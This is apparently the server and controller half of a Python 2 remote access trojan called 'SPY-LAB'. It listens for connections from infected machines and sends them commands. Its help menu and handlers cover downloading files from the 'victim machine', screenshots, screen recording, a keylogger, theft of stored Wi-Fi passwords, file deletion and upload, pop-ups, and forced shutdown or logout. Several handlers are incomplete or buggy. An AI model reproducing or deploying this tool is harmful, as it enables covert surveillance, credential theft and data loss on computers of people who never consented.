import socket
import os,sys,select,time
import cv2
import numpy as np
import pyautogui
print """
.d88888b   888888ba  dP    dP                dP         .d888888   888888ba  
88.    "'  88    `8b Y8.  .8P                88        d8'    88   88    `8b 
`Y88888b. a88aaaa8P'  Y8aa8P                 88        88aaaaa88a a88aaaa8P' 
      `8b  88           88       88888888    88        88     88   88   `8b. 
d8'   .8P  88           88                   88        88     88   88    .88 
 Y88888P   dP           dP                   88888888P 88     88   88888888P  
  """
HELP_TEXT = '''Command             | Description
---------------------------------------------------------------------------
download <file>    | Download file from client
cd                 | Connect to a client.
pic <img_name.jpg> | Capture screenshot of client machine and send to attacker.
del <file>         | Delete file of target machine.
help_me            | Show this help menu.
quit               | Close the connection
wifipass           | Get all wifi password stored on target
survey             | To know all about target machine
keylogger          | To store keylogs in ogs.txt
popup <msg>        | To show custom popup message box on target machine
shutdown	   | To shutdown the client machine 
restart		   | To restart the client machine 
logout		   | To logout from the client machine 		
sleepst		   | It standby or suspend mode the client machine 	
openfile	   | To open a file in the client machine 
sreen_rec	   | It to capture on-screen activities and save the output 
'''

print(HELP_TEXT)


host=raw_input("Enter host ip:")
port=input("Enter Host port:")
#host='0.0.0.0'
#port='666'
clear=lambda:os.system('cls')
c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.bind((host,port))
c.listen(100)
active=False
clients=[]
socks=[]
interval=0.8
print '\nListening for clients.....\n'
print 'type "help_me" to see a list of commands.'


while True:
    try:
        c.settimeout(4)
        try:
            s,a=c.accept()
        except socket.timeout:
            continue
        if(a):
            s.settimeout(None)
            socks +=[s]
            clients +=[str(a)]
        clear()
        print '\nListening for clients....\n'
        if len(clients)>0:
            for j in range(0,len(clients)):
                print '['+str((j+1))+']client:'+clients[j]+'\n'
            print 'Press ctrl+C to interact with client.'
        time.sleep(interval)
    except KeyboardInterrupt:
        clear()
        print '\nListening for clients....\n'
        if len(clients)>0:
            for j in range(0,len(clients)):
                print '['+str((j+1))+']client:'+clients[j]+'\n'
            print "...\n"
            print "[0] Exit \n"
        activate=input('\nChoose client from Above list. 0=exit : ')
        if activate==0:
            print '\nExiting....\n'
            sys.exit()
        activate -=1
        clear()
        print'Activating client.'+clients[activate]+'\n'
        active=True
        socks[activate].send('dir')
    while active:
        data=socks[activate].recv(5000)
        print data
        if data.startswith('Exit')==True:
            active=False
            print 'Press ctrl+c to return to listener mode....'
        else:
            nextcmd=raw_input('SPY-LAB$ ')
            socks[activate].send(nextcmd)
            
        if nextcmd.startswith("download")== True:

            downFile=nextcmd[9:]
            try:
                f=open(downFile,'wb')
                print 'Downloading file',downFile
                while True:
                    l=socks[activate].recv(5000)
                    while 1:
                        if l.endswith('EOFEOFX'):
                            u=l[:-7]
                            f.write(u)
                            s.send("cls")
                            print "file downloaded"
                            break
                        elif l.startswith('EOFEOFX'):
                            break
                        else:
                            f.write(l)
                            l=socks[activate].recv(5000)
                    break
                f.close()
            except:
                pass
            #dir change function
        elif nextcmd.startswith("cd")== True:
            path=nextcmd[3:]
        
        #help
        elif nextcmd.startswith("help_me")==True:
            print(HELP_TEXT)
    # snapshot upload function
        elif nextcmd.startswith("pic")== True:
            jpg=nextcmd[4:]
            downFile=nextcmd[4:]
            time.sleep(2)
            try:
                f=open(downFile,'wb')
                print 'downloading file',downFile
                while True:
                    l=socks[activate].recv(512)
                    while 1:
                        if l.endswith('EOFEOFX'):
                            u=l[:-7]
                            f.write(u)
                            s.send("cls")
                            print "file downloaded"
                            break
                        elif l.startswith('EOFEOFX'):
                            break
                        else:
                            f.write(l)
                            l=socks[activate].recv(5000)
                    break
                f.close()
            except:
                pass 
    ######delete file
        elif nextcmd.startswith("del")== True:
            file=nextcmd[4:]
    #########shutdown
        elif nextcmd.startswith("shutdown")== True:
             socks[activate].send('shutdown')
    #########restart
        elif nextcmd.startswith("restart")== True:
             socks[activate].send('restart')
    #######logout 
        elif nextcmd.startswith("logout")== True:
             socks[activate].send('logout') 
    #######sleepst 
        elif nextcmd.startswith("sleepst")== True:
             socks[activate].send('sleepst') 
    ########open file on victim machine
        elif nextcmd.startswith("openfile")== True:
            socks[activate].send('openfile') 
            sys.stdout.write("Enter File Name= ")
            sys.stdout.flush()
            openf = sys.stdin.readline()
            socks[activate].sendall(openf)
            
    #######show directory
        elif len(nextcmd)==0:
            socks[activate].send('dir')
    ####for invalid commadands 
        elif data.startswith('invalid')==True:
                    print "invalid filename"
                    
   ######### sreen recording
        elif data.startswith('sreen_rec')==True:
             socks[activate].send('sreen_rec') 
             
    ####upload system
        elif nextcmd.startswith('upload')==True:
            sendFile=nextcmd[7:]
            time.sleep(.8)
            if os.path.isfile(sendFile):
                with open(sendFile,'rb')as f:
                    while 1:
                        filedata=f.read()
                        if filedata=='':break
                        socks[activate].sendall(filedata)
                f.close()
                time.sleep(0.8)
                socks[activate].sendall('EOFEOFX')
            else:
                print "Failed.. invalid file"
                socks[activate].send('EOFEOFX')
                pass 
